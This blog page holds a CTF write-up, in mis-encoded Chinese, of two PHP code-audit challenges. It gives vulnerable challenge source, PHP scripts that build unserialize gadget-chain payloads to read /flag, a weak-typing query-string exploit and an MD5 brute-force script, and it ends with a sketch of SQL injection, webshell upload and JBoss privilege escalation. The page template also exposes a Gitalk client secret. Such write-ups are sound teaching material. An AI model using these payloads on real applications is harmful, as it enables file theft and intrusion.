<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[CTF] 2021å¼ºç½‘æ¯ WEBéƒ¨åˆ†Write Up | Today is new</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">


  
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
  

  


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="å­¦é™¢å®éªŒå®¤çš„å°ä¼™ä¼´æƒ³å‚åŠ å¼ºç½‘æ¯ï¼Œæˆ‘å°±é¡ºå¸¦ç€æŠ¥äº†ä¸ªåï¼Œä¹‹å‰å­¦äº†ä¸€ç‚¹ä»£ç å®¡è®¡ç›¸å…³çš„çŸ¥è¯†ï¼Œåšäº†ä¸¤é“ä»£ç å®¡è®¡é¢˜ç›®ã€‚
[å¼ºç½‘å…ˆé”‹]èµŒå¾’
æºç ï¼š
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;?php
//hin..." />
    <meta name="keywords" content="ä¿¡æ¯å®‰å…¨,ä»£ç å®¡è®¡" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://0xwi11.github.io">
        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
        <h1 class="site-title">Today is new</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
            <i class="fab fa-github"></i>
          </a>
        
      
        
          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
            <i class="fab fa-twitter"></i>
          </a>
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      ç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å°†ä¼šå‘ç”Ÿ
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[CTF] 2021å¼ºç½‘æ¯ WEBéƒ¨åˆ†Write Up</h2>
            <div class="post-date">2021-09-22</div>
            
            <div class="post-content" v-pre>
              <p>å­¦é™¢å®éªŒå®¤çš„å°ä¼™ä¼´æƒ³å‚åŠ å¼ºç½‘æ¯ï¼Œæˆ‘å°±é¡ºå¸¦ç€æŠ¥äº†ä¸ªåï¼Œä¹‹å‰å­¦äº†ä¸€ç‚¹ä»£ç å®¡è®¡ç›¸å…³çš„çŸ¥è¯†ï¼Œåšäº†ä¸¤é“ä»£ç å®¡è®¡é¢˜ç›®ã€‚</p>
<h2 id="å¼ºç½‘å…ˆé”‹èµŒå¾’">[å¼ºç½‘å…ˆé”‹]èµŒå¾’</h2>
<p>æºç ï¼š</p>
<pre><code class="language-html">&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;?php
//hint is in hint.php
error_reporting(1);


class Start
{
    public $name='guest';
    public $flag='syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);';
	
    public function __construct(){
        echo &quot;I think you need /etc/hint . Before this you need to see the source code&quot;;
    }

    public function _sayhello(){
        echo $this-&gt;name;
        return 'ok';
    }

    public function __wakeup(){
        echo &quot;hi&quot;;
        $this-&gt;_sayhello();
    }
    public function __get($cc){
        echo &quot;give you flag : &quot;.$this-&gt;flag;
        return ;
    }
}

class Info
{
    private $phonenumber=123123;
    public $promise='I do';
	
    public function __construct(){
        $this-&gt;promise='I will not !!!!';
        return $this-&gt;promise;
    }

    public function __toString(){
        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];
    }
}

class Room
{
    public $filename='/flag';
    public $sth_to_set;
    public $a='';
	
    public function __get($name){
        $function = $this-&gt;a;
        return $function();
    }
	
    public function Get_hint($file){
        $hint=base64_encode(file_get_contents($file));
        echo $hint;
        return ;
    }

    public function __invoke(){
        $content = $this-&gt;Get_hint($this-&gt;filename);
        echo $content;
    }
}

if(isset($_GET['hello'])){
    unserialize($_GET['hello']);
}else{
    $hi = new  Start();
}

?&gt;
</code></pre>
<p>Room é‡Œå¯ä»¥è¯»å–æ–‡ä»¶å¹¶è¾“å‡ºï¼Œä½†æ˜¯éœ€è¦ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨è¿™ä¸ªå¯¹è±¡ã€‚æ­£å¥½é‡Œé¢çš„ __get() æ–¹æ³•å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§æˆ–è€…ç§æœ‰çš„å±æ€§çš„æ—¶å€™å°±èƒ½è§¦å‘è°ƒç”¨ä»–è‡ªå·±ã€‚</p>
<p>å†çœ‹ Info å¯¹è±¡é‡Œçš„ __toString å°±å¯ä»¥è°ƒç”¨ä¸€ä¸ª Room é‡Œä¸å­˜åœ¨çš„å¯¹è±¡ ffiillee['ffiilleennaammee']ã€‚</p>
<p>ä¸ºäº†å®ç°è¾“å‡º Infoï¼Œçœ‹åˆ° Start é‡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ _sayhello() æ–¹æ³•ã€‚</p>
<p>äºæ˜¯è®© Start-&gt;name æŒ‡å‘ Infoï¼ŒInfo-&gt;file['filename'] æŒ‡å‘ Roomï¼Œç„¶åä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ Roomï¼ŒRoom-&gt;filename = '/flag' å°±èƒ½è¾“å‡º flag äº†ã€‚</p>
<p>Exp</p>
<pre><code class="language-php">class Start
{
    public $name;
}
class Info{}
class Room
{
    public $filename='/flagxxxxxx';
}
$a = new Start();
$b = new Info();
$c = new Room();
$a-&gt;name = $b;
$b-&gt;file['filename'] = $c;
$c-&gt;a = $c;

echo urlencode(serialize($a));
</code></pre>
<p>ä¼˜ç§€å­¦å¼Ÿçš„Expï¼Œæ„Ÿè§‰æ¯”æˆ‘çš„ä¼˜é›…ğŸ˜‚</p>
<pre><code class="language-php">$a=new Start();
$a-&gt;name=new Info();
$a-&gt;name-&gt;file['filename']=new Room();
$a-&gt;name-&gt;file['filename']-&gt;a=new Room();
$a-&gt;name-&gt;file['filename']-&gt;a-&gt;filename='php://filter/read=convert.base64-encode/resource=/flag';
echo(serialize($a));
</code></pre>
<h2 id="å¼ºç½‘å…ˆé”‹å¯»å®">[å¼ºç½‘å…ˆé”‹]å¯»å®</h2>
<p>æºä»£ç </p>
<pre><code class="language-php">&lt;?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);
function filter($string){
        $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\$','\(','\.','num','html','\/','\,','\'','0000000');
        $filter_phrase= '/'.implode('|',$filter_word).'/';
        return preg_replace($filter_phrase,'',$string);
    }
if($ppp){
    unset($ppp);
}
$ppp['number1'] = &quot;1&quot;;
$ppp['number2'] = &quot;1&quot;;
$ppp['nunber3'] = &quot;1&quot;;
$ppp['number4'] = '1';
$ppp['number5'] = '1';
extract($_POST);
$num1 = filter($ppp['number1']);        
$num2 = filter($ppp['number2']);        
$num3 = filter($ppp['number3']);        
$num4 = filter($ppp['number4']);
$num5 = filter($ppp['number5']);    
if(isset($num1) &amp;&amp; is_numeric($num1)){
    die(&quot;éæ•°å­—&quot;);
}
else{
  
    if($num1 &gt; 1024){
    echo &quot;ç¬¬ä¸€å±‚&quot;;
        if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){
            echo &quot;ç¬¬äºŒå±‚&quot;;
            if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){
                echo &quot;ç¬¬ä¸‰å±‚&quot;;
                if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){
                    echo &quot;ç¬¬å››å±‚&quot;;
                    if(!isset($num5)||(strlen($num5)==0)) die(&quot;no&quot;);
                    $b=json_decode(@$num5);
                        if($y = $b === NULL){
                                if($y === true){
                                    echo &quot;ç¬¬äº”å±‚&quot;;
                                    include 'KeY1lhv.php';
                                    echo $KEY1;
                                }
                        }else{
                            die(&quot;no&quot;);
                        }
                }else{
                    die(&quot;no&quot;);
                }
            }else{
                die(&quot;no&quot;);
            }
        }else{
            die(&quot;no&quot;);
        }
    }else{
        die(&quot;no111&quot;);
    }
}
</code></pre>
<p>Exp:<br>
<code>flag.php?ppp[number1]=10255www&amp;ppp[number2]=99e9&amp;ppp[number4]=0000asa&amp;ppp[number5]=null&amp;ppp[number3]=lET1TUtER7xa2tthOmR6</code><br>
ç¬¬ä¸€ä¸ªå¼±ç±»å‹æ¯”è¾ƒä¸å¤šè¯´ï¼Œç¬¬äºŒä¸ªç§‘å­¦è®¡æ•°æ³•ï¼Œç¬¬ä¸‰ä¸ªçˆ†ç ´è„šæœ¬åœ¨ä¸‹é¢åŠ ä¸Šï¼Œç¬¬å››ä¸ªåŒæ ·æ˜¯å¼±ç±»å‹ï¼Œç¬¬äº”ä¸ª===ä¼˜å…ˆäºèµ‹å€¼ã€‚</p>
<pre><code class="language-python">
# -*- coding: utf-8 -*-

import multiprocessing
import hashlib
import random
import string
import sys


CHARS = string.letters + string.digits


def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS

    while not stop_event.is_set():
        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds)

        if md5.hexdigest()[start: start+str_len] == substr:
            print rnds
            stop_event.set()


if __name__ == '__main__':
    substr = sys.argv[1].strip()

    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0

    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                         stop_event, str_len, start_pos))
                 for i in range(cpus)]

    for p in processes:
        p.start()

    for p in processes:
        p.join()
</code></pre>
<p>æœ€åè¿˜æœ‰ä¸€é“Easy WEBï¼Œå½“æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå½“æ—¶æ˜¯ä»å‰å°sqlæ³¨å…¥è·å–åˆ°äº†ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œç„¶åæ‰«ç›®å½•å‘ç°ä¸Šä¼ ç‚¹ï¼Œé€šè¿‡æ— å­—æ¯çš„PHPé©¬å­ç»•è¿‡è¿‡æ»¤ä¸Šä¼ Get Shellï¼Œwebç›®å½•ä¸‹æœ‰ä¸€ä¸ªflagæ–‡ä»¶ä½†æ˜¯æ²¡æœ‰æƒé™è¯»å–ï¼Œå½“æ—¶åˆ°è¿™é‡Œå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†ï¼Œåé¢æ¯”èµ›ç»“æŸçœ‹äº†å…¶ä»–äººçš„write upæ‰çŸ¥é“æ˜¯é€šè¿‡æ‰«æç«¯å£ï¼Œç”¨jbosså®Œæˆç¬¬äºŒæ¬¡çš„RCEææƒå»è¯»å–flagï¼Œå½“æ—¶ä¹Ÿç¡®å®æ¢æµ‹åˆ°äº†jbossç«¯å£çš„å¼€æ”¾ï¼Œå¥ˆä½•ä¹‹å‰æ²¡æœ‰å­¦ä¹ è¿‡jbossï¼Œå°±å·®ä¸€ç‚¹ç‚¹/(ã„’oã„’)/~~ã€‚</p>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://0xwi11.github.io/tag/amUzoEOq9/" class="tag">
                    ä¿¡æ¯å®‰å…¨
                  </a>
                
                  <a href="https://0xwi11.github.io/tag/XSg-eSjSDb/" class="tag">
                    ä»£ç å®¡è®¡
                  </a>
                
              </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://0xwi11.github.io/post/vulnstack-1/">
                  <h3 class="post-title">
                    å†…ç½‘æ¸—é€é¶æœº-VulnStack 1
                  </h3>
                </a>
              </div>
            

            
              
                <div id="gitalk-container" data-aos="fade-in"></div>
              

              
            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>





  
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>

      var gitalk = new Gitalk({
        clientID: 'b2be97bd4f11fa2c7ed0',
        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
        repo: 'bolg-comment',
        owner: '0xWi11',
        admin: ['0xWi11'],
        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
      })

      gitalk.render('gitalk-container')

    </script>
  

  




  </body>
</html>
